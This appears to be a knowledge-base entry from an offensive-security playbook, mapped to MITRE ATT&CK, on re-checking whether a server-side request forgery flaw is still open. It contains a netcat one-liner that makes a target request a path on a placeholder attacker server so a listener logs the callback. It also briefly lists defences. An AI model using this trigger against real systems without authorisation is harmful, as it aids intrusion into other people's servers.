---
id: proc-reverify-ssrf
tags:
  - ssrf
  - verification
  - persistence
type: procedure
tools:
  - '[[tools/nc-netcat]]'
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/echo-nc-ssrf-trigger]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:10.074Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Re-Verify-SSRF-Persistence

## Summary

Send additional SSRF payloads to confirm the vulnerability persists without mitigation.

## Description

Follow-up requests like GET /20170710 to attacker server log continued access from target IP.

## Requirements

1. Prior SSRF success
2. Ongoing listener

## Defense

Defensive measures and detection strategies:

- Patch URI handling promptly
- Implement request replay detection

## Objectives

1. Test for fixes
2. Confirm exploitability
3. Gather more evidence

## Instructions

### Step 1: Send Follow-Up Payload

**Context**: Use varied paths to re-trigger.

**Command** ([[commands/echo-nc-ssrf-trigger]]):
```bash
echo -ne "GET http://your-server.com/20170710 HTTP/1.1\\r\\n\\r\\n" | nc target-ip 80
```

> Logs confirm persistence.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]] Reconnaissance

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/echo-nc-ssrf-trigger]]

## Tools Used

- [[tools/nc-netcat]]

## Tags

- [[ssrf]]
- [[verification]]
- [[Persistence]]
